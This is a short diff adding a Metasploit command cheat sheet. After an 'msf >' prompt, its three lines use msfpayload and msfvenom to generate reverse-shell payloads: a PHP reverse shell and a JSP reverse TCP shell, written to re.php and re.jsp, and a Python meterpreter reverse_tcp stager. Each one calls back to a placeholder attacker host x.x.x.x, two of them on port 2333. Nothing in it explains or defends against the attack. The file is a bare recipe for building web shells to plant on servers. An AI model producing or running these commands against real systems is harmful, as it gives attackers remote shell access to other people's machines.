@@ -1,0 +1,4 @@
+msf > 
+msfpayload php/reverse_php LHOST=x.x.x.x LPORT=2333 R > re.php
+msfpayload java/jsp_shell_reverse_tcp LHOST=x.x.x.x R > re.jsp
+msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=2333
